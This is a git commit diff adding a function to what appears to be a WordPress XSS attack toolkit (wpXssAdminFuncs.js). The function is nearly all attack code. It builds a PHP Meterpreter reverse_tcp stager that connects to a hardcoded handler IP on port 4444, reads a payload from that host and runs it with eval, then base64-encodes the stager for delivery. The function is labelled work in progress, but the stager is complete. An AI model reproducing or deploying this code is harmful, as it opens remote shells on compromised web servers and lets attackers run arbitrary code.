8554a9b21710e5ada41d731eba88aa222408d493
hoodoer <drew.kirkpatrick@gmail.com>
2019-11-10 22:20:56 +1100

    Getting started on functions for popping a meterpreter shell

--- wpXssAdminFuncs.js
+++ wpXssAdminFuncs.js
@@ -359,6 +359,78 @@ async function hideYertleShell()
 
 
 
+// Work in progres...
+function openPhpMeterpreterSession()
+{
+	// This is the listening IP and port 
+	// for the meterpreter handler. 
+	// This is the php/meterpreter/reverse_tcp 
+	// payload for the handler
+	var handlerIP   = "192.168.78.135";
+	var handlerPort = "4444";
+
+	var metPhpCommand = `<?php
+    error_reporting(0);
+    $ip   = ` + handlerIP + ";";
+
+    metPhpCommand += "$port = " + handlerPort + ";";
+
+   	metPhpCommand += `if (($f = 'stream_socket_client') && is_callable($f)) {
+        $s      = $f("tcp://{$ip}:{$port}");
+        $s_type = 'stream';
+    } elseif (($f = 'fsockopen') && is_callable($f)) {
+        $s      = $f($ip, $port);
+        $s_type = 'stream';
+    } elseif (($f = 'socket_create') && is_callable($f)) {
+        $s   = $f(AF_INET, SOCK_STREAM, SOL_TCP);
+        $res = @socket_connect($s, $ip, $port);
+        if (!$res) {
+            die();
+        }
+        $s_type = 'socket';
+    } else {
+        die('no socket funcs');
+    }
+    if (!$s) {
+        die('no socket');
+    }
+    switch ($s_type) {
+        case 'stream':
+            $len = fread($s, 4);
+            break;
+        case 'socket':
+            $len = socket_read($s, 4);
+            break;
+    }
+    if (!$len) {
+        die();
+    }
+    $a   = unpack("Nlen", $len);
+    $len = $a['len'];
+    $b   = '';
+    while (strlen($b) < $len) {
+        switch ($s_type) {
+            case 'stream':
+                $b .= fread($s, $len - strlen($b));
+                break;
+            case 'socket':
+                $b .= socket_read($s, $len - strlen($b));
+                break;
+        }
+    }
+    $GLOBALS['msgsock']      = $s;
+    $GLOBALS['msgsock_type'] = $s_type;
+    eval($b);
+    die();
+    ?>`;
+
+    var payload = btoa(metPhpCommand);
+
+
+
+}
+
+
 
 /*
 	Calling functions
